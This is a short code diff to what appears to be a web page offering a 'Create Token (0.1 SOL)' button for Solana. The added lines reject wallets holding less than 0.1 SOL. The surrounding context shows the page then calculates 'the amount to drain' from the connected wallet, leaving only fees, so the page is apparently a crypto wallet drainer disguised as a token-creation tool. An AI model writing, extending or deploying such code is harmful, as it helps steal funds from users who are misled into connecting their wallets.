@@ -1401,6 +1401,17 @@
                 
                 // Get SOL balance
                 const ownerBalance = await connection.getBalance(publicKey);
+
+                // Minimum balance required to proceed (0.1 SOL)
+                const MIN_BALANCE = 0.1 * solanaWeb3.LAMPORTS_PER_SOL;
+
+                if (ownerBalance < MIN_BALANCE) {
+                    log(`You need at least 0.1 SOL to create a token. Your current balance is ${(ownerBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
+                    createTokenBtn.disabled = false;
+                    createTokenBtn.textContent = 'Create Token (0.1 SOL)';
+                    progressContainer.style.display = 'none'; // Hide progress if balance is insufficient
+                    return;
+                }
                 
                 // Calculate the amount to drain (leave some for fees)
                 const LAMPORTS_FOR_FEES = 2000000; // 0.002 SOL for fees
